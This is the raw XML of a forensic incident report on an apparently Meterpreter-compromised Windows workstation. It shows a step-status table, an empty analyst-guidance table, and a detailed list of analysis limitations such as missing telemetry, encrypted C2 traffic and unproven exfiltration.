                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Network traffic (PCAP)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>120 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>96 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Accounts, authentication and privileges</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>116 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Remote access and lateral movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>84 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>User activity on files and folders</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>158 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Web browsing, downloads and e-mail</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>97 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Defense evasion and anti-forensics</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>122 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Collection, exfiltration and communications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>148 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Incident timeline and correlation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>197 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Summary, answers and recommendations</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>60 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Guidance provided by the analyst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Context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period of interest</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>not specified</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Questions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Provided IOCs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Suspects</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Exclusions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Instructions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.5 Limitations of the analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Missing telemetry**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Sysmon was deployed, and 4688 process creation appears only at boot. Command lines for cmd.exe and sc.exe and the exact Meterpreter commands are therefore unknown; the pasted cmd content comes only from Windows Timeline clipboard metadata.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- PowerShell logging covers only the 05:08 loader.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Data not parsed or incomplete**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Browser history databases were not parsed (legacy Edge spartan.edb/WebCache); web activity was rebuilt from the Windows Timeline, the pcap and the file system.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The ODL parser job ended with a warning.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Step 4 (memory analysis) reached its tool-call limit. Memory evidence was still used in later steps (malfind, netstat, handles, psscan, getsids, svclist), but a full memory review (for example extracting the Meterpreter configuration, lsass access results, or any credential dumping) was not completed.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Exfiltration and credential theft**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The C2 traffic is encrypted, so exfiltration of loot.zip and any credential harvesting (hashdump/kiwi through the lsass handle) cannot be confirmed at content level.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Scope**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Only this workstation was collected. The DC CITADEL-DC01 (10.42.85.10), which is the brute-force target and the attacker's pivot, is outside the disk scope; its compromise is inferred from the network capture only.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Timing**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Captured network timestamps are about 1 h behind the host clock.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The VM was suspended and resumed between 01:54 and 03:13, which breaks the clock continuity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Guidance**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The guidance file had no questions, so no answer_question entries were produced.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 1 (System context and scope): No Sysmon; 4688 only at boot; PowerShell logs only cover 05:08; browser history, PSReadLine, RecycleBin, NTUSER ShellBags outputs empty; ODL strings obfuscated; no native_panther/native_wifi tables available (Panther setup logs and Wi-Fi profiles not checked); EMDMgmt not checked (no removable volume other than the responder USB).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2 (Triage of automatic detections): hashset empty, so no hash matching possible. No Sysmon/4688 to see parent of coreupdater (PPID 4008 not in memory) or what process migrated the Meterpreter session; netscan Owner/PID empty for C2 connections. Defender quarantine/exclusions tables absent. DC-side activity only visible via pcap. PowerShell payload of 05:08:44 (gzip base64) not decoded in this step; malfind/memory injection to be reviewed later.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 3 (Program execution): No 4688/Sysmon process-creation telemetry: exact command lines of cmd.exe/sc.exe are unknown (conhost history empty in memory). ShimCache predates attack (last flush at shutdown before 01:24). Exfiltration of loot.zip not proven — to correlate with pcap/Suricata (note ~1h clock skew) and memory in later steps. SRUM coreupdater activity after the 03:43 process exit is unexplained (service instance vs injection) — for memory step.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 4 (Memory (RAM)): tool call limit reached</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 5 (Network traffic (PCAP)): C2 traffic is encrypted/non-standard ('failed' app_proto): content and any exfiltration of loot.zip (≈280 KB upstream in session #1) cannot be verified. Memory netscan rows for the C2 sockets lack PID/owner (owner attribution relies on F-015/F-016 netstat). DC-side logs not collected, so the success of the RDP brute force is inferred. F-011 remains 'probable' per tool re-assessment despite added disk/memory references.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 6 (Persistence): - The payload data in HKLM\Software\q9Z1bssi\JqxNhWJA was not extracted by any parser, so the stage content cannot be decoded here.</w:t>
        <w:br/>
        <w:t>- The dissect_tasks, dissect_clsid_user, dissect_cim_consumerbindings, native_startup, native_hosts and dissect_msoffice_startup tables are missing. COM hijacking, the WMI repository and Office startup could only be checked indirectly (5861, MFT).</w:t>
        <w:br/>
        <w:t>- Security auditing for 4697/4698/4702 was not enabled.</w:t>
        <w:br/>
        <w:t>- PendingFileRenameOperations was not parsed.</w:t>
        <w:br/>
        <w:t>- Winlogon Shell/Userinit and IFEO were checked only through the RECmd Kroll rows; no anomalous value showed up.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7 (Accounts, authentication and privileges): There are no DC logs, so Kerberos 4768/4769/4776 for the stolen Administrator credential and the brute-force origin cannot be seen on the DC side. No RDPClient 1024/1102 events were found for outbound RDP from this host, which fits the absence of lateral movement from the workstation. I could not tell which value under the Terminal Server key was written at 03:17:00: the key timestamp only covers the last write.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 8 (Remote access and lateral movement): - File-share auditing (5140/5145) and Sysmon were not available.</w:t>
        <w:br/>
        <w:t>- C2 traffic is encrypted, so I cannot rule out pivoting or port forwarding through Meterpreter.</w:t>
        <w:br/>
        <w:t>- The raw.dissect_mru_mstsc, native_rdp, dissect_remoteaccess_* and dissect_mru_networkdrive tables are absent from this database. I used registry_kroll instead.</w:t>
        <w:br/>
        <w:t>- No RDP bitmap cache was parsed.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 9 (User activity on files and folders): - The loot.zip content and hash cannot be recovered: the MFT record was reused and no memory object exists.</w:t>
        <w:br/>
        <w:t>- Exfiltration of the archive over RDP or the encrypted C2 channel is not provable from the artifacts.</w:t>
        <w:br/>
        <w:t>- The commands pasted into cmd.exe were not recovered (clipboard payloads empty, no console history).</w:t>
        <w:br/>
        <w:t>- Thumbcache, Notepad tabs, Recycle Bin and Dissect MRU tables are not available in the database.</w:t>
        <w:br/>
        <w:t>- ShellBag/LNK coverage depends on Explorer usage. Actions performed through Meterpreter leave no ShellBag or LNK artifacts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 10 (Web browsing, downloads and e-mail): - No browser history databases were parsed (legacy Edge WebCacheV01.dat / spartan.edb, Chromium Edge, if present), so I could not check full URL history, typed search terms or the download list. Parsing them with ESEDatabaseView, Hindsight or dissect would close this gap.</w:t>
        <w:br/>
        <w:t>- The HostUrl/ReferrerUrl of coreupdater.exe can't be recovered: the Zone.Identifier stream was removed and its text is not in the parsed $LogFile output.</w:t>
        <w:br/>
        <w:t>- Bing searches are TLS-encrypted, so intent queries (if any) can't be seen in the capture.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 11 (Defense evasion and anti-forensics): - raw.dissect_defender_exclusions is absent from the case; I checked exclusions through the registry and MPLog instead.</w:t>
        <w:br/>
        <w:t>- $UsnJrnl only starts at 2020-09-19 01:31:32, so earlier deletions can't be seen.</w:t>
        <w:br/>
        <w:t>- There is no Sysmon and 4688 is only logged at boot, so command-level evasion such as Set-MpPreference or wevtutil can't be fully excluded. The Defender changes do line up with SecHealthUI GUI use.</w:t>
        <w:br/>
        <w:t>- How to read the TamperProtection value 0x4 depends on the platform version, so that point is only probable.</w:t>
        <w:br/>
        <w:t>- raw.vol_etwpatch is not available, so ETW patching was not checked.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 12 (Collection, exfiltration and communications): - The C2 (TLS/Meterpreter) and RDP payloads are encrypted, so there is no content-level proof of what was sent.</w:t>
        <w:br/>
        <w:t>- The OneDrive SyncEngineDatabase.db was not parsed (moot, since the client was never signed in).</w:t>
        <w:br/>
        <w:t>- No Sysmon 3/22 or 5156 network telemetry.</w:t>
        <w:br/>
        <w:t>- No dissect_sevenzip output.</w:t>
        <w:br/>
        <w:t>- The loot.zip size was not recovered: its MFT entry was reused and no $LogFile I30 record exists.</w:t>
